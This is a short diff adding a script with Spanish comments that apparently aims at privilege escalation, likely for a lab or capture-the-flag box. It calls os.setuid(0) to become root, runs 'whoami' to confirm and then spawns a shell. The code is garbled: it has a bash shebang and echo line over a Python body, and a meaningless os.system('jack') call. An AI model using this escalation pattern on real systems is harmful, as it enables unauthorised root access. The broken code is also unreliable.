@@ -1,0 +1,21 @@
+#!/bin/bash
+
+echo " Los comadnos y explicaciones adentro del script."
+
+import os
+
+os.system('id')
+
+#el usuario a modificar
+os.system('jack')
+
+#este lo cambia a root
+os.setuid(0)
+
+
+#deberia mostrar root este comando:
+os.system('whoami')
+
+
+os.system('sh')
+
